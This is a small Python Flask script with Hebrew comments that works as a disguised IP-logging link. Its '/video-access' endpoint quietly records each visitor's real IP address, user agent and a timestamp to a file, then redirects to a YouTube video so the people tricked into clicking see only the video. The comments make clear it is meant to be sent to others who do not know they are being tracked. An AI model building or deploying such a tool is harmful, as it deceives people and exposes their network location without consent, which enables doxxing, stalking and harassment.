from flask import Flask, request, redirect
import datetime

app = Flask(__name__)

# כאן שמים את הלינק לסרטון שאתה רוצה שהם יראו בסוף
YOUTUBE_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ" 

@app.route('/video-access')
def logger():
    # ה-IP האמיתי של המשתמש נמצא בדרך כלל ב-X-Forwarded-For כשמשתמשים בשרתים כמו Render
    ip_addr = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    # מידע נוסף על המכשיר (Browser, OS)
    user_agent = request.headers.get('User-Agent')
    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    # שמירה לקובץ טקסט (או פשוט להדפיס לטרמינל)
    log_entry = f"[{timestamp}] IP: {ip_addr} | User-Agent: {user_agent}\n"
    with open("logs.txt", "a") as f:
        f.write(log_entry)
    
    print(f"Captured: {ip_addr}")

    # העברה מיידית ליוטיוב
    return redirect(YOUTUBE_URL)

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)